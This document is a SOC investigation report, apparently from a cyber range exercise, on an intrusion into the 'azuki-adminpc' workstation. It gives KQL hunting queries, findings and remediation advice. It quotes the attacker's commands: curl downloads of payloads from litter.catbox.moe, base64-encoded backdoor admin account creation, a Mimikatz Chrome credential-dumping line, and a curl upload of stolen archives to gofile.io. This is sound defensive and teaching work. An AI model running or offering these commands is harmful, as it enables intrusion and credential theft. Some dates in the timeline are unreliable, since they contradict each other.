<img width="507" height="748" alt="image" src="https://github.com/user-attachments/assets/8c4874be-6f30-4f5c-9253-3012f85a5209" />

# SOC Investigation Report Phase Three: Bridge Takeover

**Report ID** INC-2025-12-23-AZUKI

**Analyst** Danielle Morris

**Date** December 24, 2025

**Incident Date** 24-November-2025

---

## 1. Executive Summary (Attack Context)

Prior to the events detailed in this report, the attacker gained an initial foothold in the environment, likely through the compromise of the kenji.sato account or a staging machine at 10.1.0.204. The investigation picks up at the point of lateral movement, where the attacker utilized compromised credentials for yuki.tanaka to access the high-value target, azuki-adminpc. This report details the subsequent credential harvesting, internal discovery, data staging, and eventual exfiltration to public cloud services.

---

## 2. Findings

### Key Indicators of Compromise (IOCs):

* **Attack Source IPs**
    * Lateral Movement Source: `10.1.0.204`
    * Exfiltration Destination IP: `45.112.123.227`

* **Compromised Accounts**
    * Lateral Movement: `yuki.tanaka`
    * Entry Point Account: `kenji.sato`

* **Malicious Files and Tools**
    * C2 Implant: `meterpreter.exe`
    * Credential Theft Tool: `m.exe` (Renamed Mimikatz)
    * Compressed Payload: `KB5044273-x64.7z`
    * LOTL Tools Used:
        * `curl.exe` (Tool download and data exfiltration)
        * `7z.exe` (Payload extraction)
        * `robocopy.exe` (Automated data collection)
        * `tar.exe` (Data archiving)
        * `nltest.exe` (Domain trust discovery)

* **Persistence Mechanisms**
    * Shadow Admin Account: `yuki.tanaka2`
    * Privilege Escalation: Promotion of `yuki.tanaka2` to local Administrators group

* **Command and Control (C2)**
    * Named Pipe: `\Device\NamedPipe\msf-pipe-5902`
    * Payload Hosting Service: `litter.catbox.moe`

* **Exfiltration Indicators**
    * Exfiltration Service: `gofile.io`
    * Exfiltration URL: `https://store1.gofile.io/uploadFile`
    * Stolen Password Database: `Azuki-Passwords.kdbx`
    * Plaintext Credential File: `OLD-Passwords.txt`


### KQL Queries Used:

#### **Query 1 - Lateral Movement & Initial Access**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| project Timestamp, DeviceName, AccountName, RemoteIP, RemoteDeviceName
| sort by Timestamp desc
```

**Results:** Observed multiple Remote Interactive (Logon Type 10) logons to `azuki-adminpc` originating from `10.1.0.204`. The activity was performed using the account `yuki.tanaka` and occurred between **November 24–25, 2025**. This pattern is consistent with **internal lateral movement**, with the source IP likely acting as a staging or pivot system.

**Attachments:**

*Lateral Movement*

<img width="1622" height="406" alt="image" src="https://github.com/user-attachments/assets/ea225dac-9c23-4bb1-8e60-b7b9f1b12841" />

---

#### Query 2 - Malware Staging and Payload Retrieval

```kql
DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| where RemoteUrl !endswith "microsoft.com" and RemoteUrl !endswith "windowsupdate.com"
| where RemoteUrl != ""
| where InitiatingProcessFileName contains "curl"
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessFileName, ProcessCommandLine
| sort by Timestamp asc
```

**Results:** Analysis of command-line and network activity identified two high-interest external domains accessed via `curl.exe` during the attack window: `litter.catbox.moe` at **11:21 PM** and `store1.gofile.io` at **11:41 PM**.

The investigation confirmed `litter.catbox.moe` as the malware hosting service used to stage second-stage payloads. The observed access at **11:21 PM** aligns with the initial malware download phase of the intrusion. 

At **11:21:12 PM**, the attacker executed `curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` to retrieve a password-protected archive. The filename `KB5044273-x64.7z` was used to masquerade as a legitimate Windows Knowledge Base update, and the payload was staged in `C:\Windows\Temp\cache\`, a directory repeatedly leveraged during the incident.

**Attachments:**

*Malware Download Command*

<img width="1363" height="297" alt="image" src="https://github.com/user-attachments/assets/28c20919-9cf4-471e-a07a-70ac6e4f7497" />

---

#### Archive Extraction and C2 Implant Identification

#### Query 3 - Archive Extraction Command

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("7z", "7za", "winrar", "unzip", "expand")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** Identified the transition from staging to execution when the attacker extracted the previously downloaded archive, indicating the start of second-stage payload deployment. At **11:21:32 PM**, the attacker executed `7z.exe` to extract the masqueraded update archive `KB5044273-x64.7z` into the `C:\Windows\Temp\cache\` directory.

The command `7z.exe x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y` was used to extract files with full paths while suppressing overwrite prompts, enabling silent execution. The password-protected archive contained malicious second-stage components deployed into the temporary cache directory.

**Attachments:**

*7z Extraction Command*

<img width="1369" height="307" alt="image" src="https://github.com/user-attachments/assets/54f60a0f-8706-4e2a-82fe-4e463bd8e979" />

---

#### Query 4 - C2 Implant Identification

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessFileName == "7z.exe"
| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessCommandLine
```

**Results:** Post-extraction analysis identified the deployment of a primary command-and-control implant within the staging directory. The attacker dropped `meterpreter.exe`, a payload associated with the Metasploit Framework, into the staging environment. This implant provides an interactive command shell, enabling remote command execution, network reconnaissance, and post-exploitation activity across compromised systems.

**Attachments:**

<img width="942" height="189" alt="image" src="https://github.com/user-attachments/assets/13add8e4-30f4-4b9a-a798-37f6bd173903" />

---

#### Query 5 - C2 Named Pipe

```kql
DeviceEvents
| where ActionType == "NamedPipeEvent"
| where Timestamp >= datetime(2025-11-24T23:20:00Z)
| extend Prop = parse_json(AdditionalFields)
| extend PipeName = tostring(Prop.PipeName)
| project Timestamp, DeviceName, ActionType, PipeName, InitiatingProcessFileName, AdditionalFields
| sort by Timestamp asc
```

**Results:** Shortly after execution of the C2 implant at **11:24:35 PM**, a named pipe event consistent with command-and-control activity was recorded. The named pipe `\Device\NamedPipe\msf-pipe-5902` was created, matching a known Metasploit Framework naming convention. This named pipe enabled inter-process communication for the implant, supporting advanced post-exploitation capabilities such as pivoting and automated credential harvesting.

**Attachments:**

*Named Pipe Event*

<img width="1355" height="215" alt="image" src="https://github.com/user-attachments/assets/63056c41-184f-4181-a824-eeb87caf77b3" />

---

#### Query 6 - Persistence and Privilege Escalation

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-e ")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** The encoded PowerShell activity identified two suspicious commands executed at **11:51 PM**, indicating the establishment of local persistence and privilege escalation on `azuki-adminpc`. 

*Command One - Shadow Account Creation*

- Input Base64 String: `bgBlAHQAIAB1AHMAZQByACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIABCAEAAYwBrAGQAMAAwAHIAMgAwADIANAAhACAALwBhAGQAZAA=` 

- Decoded Command: `net user yuki.tanaka2 B@ckd00r2024! /add`

Decoding the first Base64-encoded command revealed the creation of a local backdoor account, confirming unauthorized account creation. The account name **`yuki.tanaka2`** closely mimics the legitimate user `yuki.tanaka`, consistent with a shadow account technique designed to evade casual detection.

*Second Command - Privilege Escalation*

 - Input Base64 String: `bgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIAAvAGEAZABkAA==`
   
- Decoded Command: `net localgroup Administrators yuki.tanaka2 /add`

A second decoded command immediately promoted the backdoor account to the local Administrators group, establishing persistent high-privilege access independent of the original compromised credentials.

**Attachments:**

*Base64 Encoded Commands*

<img width="1347" height="126" alt="image" src="https://github.com/user-attachments/assets/7f355a8f-003c-4e6a-ab62-f8857a1751f2" />

---

*CyberChef - Decoded First Command*

<img width="1521" height="712" alt="image" src="https://github.com/user-attachments/assets/8c31759d-fc33-4314-8095-b9e5a63b04ce" />

---

*CyberChef - Decoded Second Command*

<img width="1508" height="656" alt="image" src="https://github.com/user-attachments/assets/237c6111-c051-475d-aee1-c2dff6a90027" />

---

#### Query 7 - System User Discovery and Session Enumeration

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName has_any ("qwinsta.exe", "rwinsta.exe", "query.exe", "net.exe", "quser.exe")
| project Timestamp, FileName, ProcessCommandLine, AccountName, AccountDomain
| sort by Timestamp asc
```

**Results:** Identified a burst of discovery-related command execution as the attacker enumerated active users and sessions on the target workstation. At **11:08:58 PM**, the attacker executed `qwinsta.exe` to enumerate active and disconnected Remote Desktop sessions, consistent with System Owner/User Discovery. Immediately following this activity, additional discovery commands (`quser` and `query user`) were executed to collect detailed session information, including logon status and idle time, to identify potential high-privilege users.

**Attachments:**

<img width="1311" height="531" alt="image" src="https://github.com/user-attachments/assets/848b463c-3a68-42b9-97c6-088110cbdefb" />

---
#### Domain Trust and Network Discovery

#### Query 8 - Domain Trusts

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("trust", "domain_trusts", "all_trusts", "trustedDomain")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** Identified a transition from local user discovery to broader environmental reconnaissance activity. At **11:09 PM**, the attacker executed `nltest.exe /domain_trusts /all_trusts` to enumerate domain trust relationships, consistent with Domain Trust Discovery. The use of the `/all_trusts` parameter enabled retrieval of forest and non-transitive trust relationships, allowing the attacker to map the domain architecture and identify potential pathways for future lateral movement.

**Attachments:**

*Domain Trust Mapping*

<img width="1294" height="146" alt="image" src="https://github.com/user-attachments/assets/1c331ac2-a4d2-4158-b066-9d88547a10a6" />

---

#### Query 9 - Network Connections

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("netstat.exe", "arp.exe", "ipconfig.exe", "nbtstat.exe")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** Immediately following the above activity, at **11:10 PM**, the attacker performed network state reconnaissance using `NETSTAT.EXE -ano`. The `-ano` flags enabled visibility into active TCP/UDP connections, listening ports, and associated process IDs (PIDs), allowing correlation of network activity to specific processes and identification of internal assets and monitored services.


**Attachments:**

*Network Connection Discovery Command*

<img width="1263" height="430" alt="image" src="https://github.com/user-attachments/assets/192b4633-acaf-458a-9cc9-7ce1faaad7a2" />

---

#### Credential Discovery and Identification of Unsecured Passwords

#### Query 10 - KeePass Search

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine contains "Azuki-Passwords.kdbx" or ProcessCommandLine contains "*.kdbx"
| project Timestamp, FileName, ProcessCommandLine, AccountName
```

**Results:** Observed targeted file discovery activity focused on locating encrypted credential stores using native Windows utilities. The attacker executed `cmd.exe /c where /r C:\Users *.kdbx` to perform a recursive search across user directories, consistent with File and Directory Discovery. This activity resulted in the discovery of `C:\Users\yuki.tanaka\Documents\Passwords\Azuki-Passwords.kdbx`, indicating a deliberate effort to identify high-value credential databases while minimizing operational footprint through the use of built-in tools.

**Attachments:**

<img width="1351" height="200" alt="image" src="https://github.com/user-attachments/assets/0354ea48-e674-4665-b2fd-8ad5a1541c12" />

---

#### Query 11 - Plaintext Credential Search


```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("type", "findstr", "notepad", "more")
| where ProcessCommandLine has_any (".txt", ".lnk", "pass", "cred")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** Identified the discovery of unsecured credentials resulting from poor security hygiene within the `yuki.tanaka` user profile. At **11:15:52 PM**, the attacker accessed and viewed a cleartext credential file, **`OLD-Passwords.txt`**, consistent with Unsecured Credentials. The file was opened using `notepad.exe` from the user’s Desktop, indicating a deliberate search for easily accessible credentials and directly enabling the attacker’s subsequent data collection activities.

**Attachments:**

*Unsecured Credentials*

<img width="1284" height="281" alt="image" src="https://github.com/user-attachments/assets/b6cf9b92-d3c4-4074-b09f-313f5d38889a" />

---
#### Data Staging and Automated Collection

#### Query 12 - Staging Directory

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where FileName endswith ".tar.gz"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine
| sort by Timestamp asc
```

**Results:** Identified the creation of a covert data staging location designed to aggregate collected information while evading detection. The attacker created a hidden staging directory at `C:\ProgramData\Microsoft\Crypto\staging`, consistent with Data Staging. The directory path was deliberately chosen to mimic legitimate Microsoft Cryptographic Services locations, increasing the likelihood that malicious activity would blend in with normal system operations and remain unnoticed by administrators.

**Attachments:**

*Data Staging Directory*

<img width="1367" height="294" alt="image" src="https://github.com/user-attachments/assets/e0d909bf-60cb-49b0-96b2-dd2b12e4b773" />

---

#### Query 13 - Automated Collection


```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("robocopy.exe", "xcopy.exe", "cmd.exe")
| where ProcessCommandLine has_any ("Banking", "Financial", "Records")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:** Identified automated data collection activity as the attacker transitioned to bulk data theft using native Windows utilities. At **11:37:03 PM**, the attacker executed `Robocopy.exe` to copy user document directories into the staging location, consistent with Automated Collection. The command `Robocopy.exe C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP` leveraged recursive copying, minimal retry logic, and suppressed output, indicating a deliberate effort to efficiently collect data while minimizing user visibility.


**Attachments:**

*Automated Data Collection Command*

<img width="1368" height="277" alt="image" src="https://github.com/user-attachments/assets/3d1f4df7-442c-47ec-9954-51a4cb2ba333" />

---

#### Query 14 - Exfiltration Volume

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where FileName endswith ".tar.gz"
| where FolderPath has_any ("Crypto\\staging", "Windows\\Temp\\cache")
```

**Results:** A total of **8 compressed archives** were created during the collection phase. One archive originated from `azuki-sl` containing initial reconnaissance data, while **seven archives** were created on `azuki-adminpc`, including **five** staged in `C:\ProgramData\Microsoft\Crypto\staging\` (credentials, QuickBooks, banking, tax, and contracts data) and **two** in `C:\Windows\Temp\cache\` containing browser credential and session data.

**Attachments:**

*Seven Archives*

<img width="1366" height="329" alt="image" src="https://github.com/user-attachments/assets/6e3e960b-a5b4-4a40-9389-e5a4323ffce1" />

---

#### Query 15 - Secondary Tool Ingress

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("powershell.exe", "certutil.exe", "curl.exe", "bitsadmin.exe")
| where ProcessCommandLine has_any ("http", "https", "download", "wget", "iwr")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Results:**  Identified a secondary tool transfer indicating a shift toward specialized credential theft activity. At **12:55 AM on November 25**, the attacker executed `curl.exe` to download a compressed archive containing memory-dumping utilities. The command `curl.exe -L -o C:\Windows\Temp\cache\m-temp.7z https://litter.catbox.moe/gfdb9v.7z` retrieved an archive that contained a renamed Mimikatz binary (`m.exe`), which was staged following the completion of the initial data collection phase.


**Attachments:**

*Credential Theft Tool Download*

<img width="1324" height="272" alt="image" src="https://github.com/user-attachments/assets/fb890f9e-cffc-47e5-af97-ab5299415729" />

---

#### Credential Harvesting and Exfiltration

#### Query 16 - Browser Credential Dumping


```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine contains "Login Data"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Results:** Identified the execution of a credential-dumping utility to extract browser-stored secrets. The attacker executed a renamed Mimikatz binary, **`m.exe`**, to decrypt Google Chrome credentials using DPAPI. The command `m.exe privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit` leveraged elevated privileges to access protected memory and decrypt the Chrome Login Data database into plaintext.

---

#### Query 17 - Network Exfiltration

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessFileName =~ "curl.exe"
| where RemoteUrl contains "gofile.io"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort
```

**Results:** Identified a series of outbound POST requests used to exfiltrate staged data from the compromised host. The attacker executed `curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`, leveraging the legitimate file-sharing service `gofile.io` for data exfiltration.

Exfiltration traffic was sent to `45.112.123.227` over HTTPS (port 443), allowing the attacker to blend malicious activity with normal encrypted web traffic and evade standard network inspection controls. 

Analysis of subsequent archive activity identified **`KeePass-Master-Password.txt`**, enabling immediate access to the encrypted password vault **`Azuki-Passwords.kdbx`** and resulting in full compromise of the stored credentials without the need for cracking or brute-force techniques.

---

## 3. Investigation Summary 

### What Happened: 

The SilentLynx threat actor successfully compromised the azuki-adminpc by moving laterally from `10.1.0.204` using the `yuki.tanaka` account. The attacker established persistence via a shadow administrator account (`yuki.tanaka2`) and deployed a Metasploit Meterpreter C2 implant. Following extensive internal reconnaissance of domain trusts and network connections, the attacker used native tools (`Robocopy`, `where`, `tar`) to aggregate and archive banking, tax, and credential data. The intrusion concluded with the use of a renamed Mimikatz tool to dump browser passwords and the exfiltration of 8 distinct archives to the `gofile.io` cloud service.

---

### Phase Attack Timeline:

| Field | Detail |
| :--- | :--- |
| **Started** (First Successful Login) | 2025-11-24T23:06:52Z |
| **Ended** (Last Observed Activity)| 2025-11-25T00:56:00Z  |
| **Duration** | Approximately 1 hour and 49 minutes |
| **Impact Level** | **Critical** (Full system compromise, credential theft, and data exfiltration) |

---

## 4. Who, What, When, Where, Why, How

### Who

| Field | Detail |
| :--- | :--- |
| **Attacker Origin** | Internal Pivot: `10.1.0.204`, External IP: `88.97.178.12` |
| **Attribution Confidence** | High |
| **Compromised Accounts** | Primary: `yuki.tanaka`, Backdoor: `yuki.tanaka2` |
| **Affected Systems** | `azuki-adminpc` |
| **Impact on Users** | Full administrative system compromise, plaintext password discovery, decryption of browser-stored credentials, and theft of financial data archives. |

---

### What 

| Field | Detail |
| :--- | :--- |
| **Attack Type** | Lateral Movement (RDP) leading to a hands-on-keyboard operation focused on Persistence, specialized Credential Theft, and bulk Data Exfiltration. |
| **Malicious Activities** | **Reconnaissance** (`qwinsta`, `nltest`, `netstat`), **Persistence** (Shadow account `yuki.tanaka2`), **Credential Dumping** (`m.exe` DPAPI decryption of Chrome databases), **Automated Collection** (`Robocopy` of Banking/Financial data), **Data Staging** (8 total `.tar.gz` archives in Crypto and Temp directories), and **Data Exfiltration** to `gofile.io`. |
| **Payloads Deployed** | C2 Implant (`meterpreter.exe`), Credential Dumper (`m.exe` / Mimikatz), and Compressed Toolkits (`KB5044273-x64.7z`, `m-temp.7z`).|
| **Data Targeted** | Stolen browser credentials (Chrome), KeePass Database (`Azuki-Passwords.kdbx`) with Master Password, and corporate sensitive data (Banking, QuickBooks, Tax, and Contract records). |

---

### When 

| Event | Detail |
| :--- | :--- |
| **First Failed Logon** | Nov 24, 2025, 23:06:52Z (Initial Lateral Movement RDP) |
| **Last Observed Activity** | Nov 25, 2025, 00:56:00Z (Final exfiltrations) |
| **Activity Span** | Approximately **1 hour and 49 minutes** |
| **Detection Time** | 3 Days (Detected on 2025-11-22) |
| **Is it still active?** | **Yes** (Persistence mechanisms remain). |

---

### Where

| Field | Detail |
| :--- | :--- |
| **Attack Origin (Internal Pivot)** | Source IP `10.1.0.204` (Used as the bridgehead to access the admin PC). |
| **C2 and Exfil Location** | **C2/Payload Server:** `litter.catbox.moe` (HTTPS). **Exfiltration:** Data sent to cloud service `gofile.io` via IP `45.112.123.227` on port 443. |
| **Target System (Internal)** | `azuki-adminpc` (The CEO's administrative workstation targeted for credential theft). |
| **Affected Directories/Files** | `C:\ProgramData\Microsoft\Crypto\staging` (Stolen document staging) and `C:\Windows\Temp\cache\` (Malware staging and browser database dumping). |
| **Network Segment** | The target `azuki-adminpc` is within the **internal network/private addressing space**. |
| **Lateral Recon Destination** | The attacker utilized `nltest.exe` to enumerate all trusted domains within the Active Directory forest. |

---

### Why 

| Field | Detail |
| :--- | :--- |
| **Likely Motive** | Primarily **Financially motivated**, focused on **bulk financial data theft** (QuickBooks, banking/tax records) and high-value credential harvesting (Chrome DPAPI dumping and KeePass vault theft) to facilitate account takeovers and direct financial fraud. |
| **Target Value** | The system `azuki-adminpc` was targeted due to its role as an administrative workstation for the CEO containing sensitive corporate financial documentation, master password cleartext files, and expansive domain trust information for potential forest-wide lateral movement. |

---

### How 

| Field | Detail |
| :--- | :--- |
| **Initial Access Method** | Lateral movement via Remote Interactive session (RDP) from a compromised internal pivot host. |
| **Tools/Techniques Used** | Living-off-the-Land (LOTL) binaries (`curl`, `tar`, `robocopy`), renamed Mimikatz (`m.exe`), and Meterpreter C2. |
| **Persistence Method** | Implementation of a "shadow" administrator account (`yuki.tanaka2`) to maintain access independent of initial compromised credentials. |
| **Data Collection Method** | Automated staging of 8 compressed archives in masqueraded system directories (`\Microsoft\Crypto\staging`). |
| **Communication Method** | Outbound HTTPS (Port 443) traffic to legitimate file-sharing services (`gofile.io`) to bypass network egress filtering. |

---

## 5. Recommendations for Findings

### Immediate Actions Needed:

1. **Account Containment:** Disable the `yuki.tanaka2` shadow administrator account and reset credentials for the primary `yuki.tanaka` account.

2. **Credential Revocation:** Force a global password reset for all accounts found in the Azuki-Passwords.kdbx vault and the `OLD-Passwords.txt` file, as these are now considered compromised.

3. **Network Blocking:** Implement immediate egress blocks at the firewall for the identified malicious IP `45.112.123.227` and the hosting domain `litter.catbox.moe`.

### Short-term Improvements (1-30 days):

1. **Staging Cleanup:** Conduct a forensic sweep of `C:\ProgramData\Microsoft\Crypto\` and `C:\Windows\Temp\cache\` to remove any residual `.tar.gz` archives or malicious binaries (`m.exe`, `meterpreter.exe`).

2. **RDP Hardening:** Restrict Remote Desktop Protocol (RDP) access via Group Policy to require Multi-Factor Authentication (MFA) and limit connection sources to specific administrative jump boxes.

3. **Clean Desk Policy for Filesystem:** Scan all user desktops and document folders for plaintext password files (.txt, .xlsx, .docx) and implement automated deletion or encryption for files matching credential-related keywords.

### Long-term Security Enhancements:

1. **LAPS Implementation:** Deploy Local Administrator Password Solution (LAPS) to ensure that local administrative passwords are unique, complex, and automatically rotated across all workstations.

2. **Application Whitelisting (EDR):** Configure EDR policies to block the execution of unsigned or untrusted binaries from temporary directories like `\Windows\Temp\` and `\AppData\Local\Temp\`.

3. **DLP (Data Loss Prevention):** Implement DLP rules to alert or block the upload of compressed archives (`.7z`, `.tar.gz`, `.zip`) to public file-sharing services (e.g., Gofile, Catbox, Mega) from administrative workstations.

### Detection Improvements:

1. **Monitoring Gaps Identified:** Lack of alerts for non-standard processes (like curl.exe or tar.exe) interacting with sensitive browser profile directories (Login Data).

2. **Recommended Alerts:** Create a high-severity alert for any process creating subdirectories named "staging" or "cache" within C:\ProgramData\Microsoft\Crypto\.

3. **Query Improvements:** Implement a proactive hunting query to detect native binaries (Robocopy.exe, tar.exe) used in sequence to touch multiple user document directories within a short window.

---

Report Status: Complete

Next Review: 2026-01-24 (30 days from now)

Distribution: Cyber Range
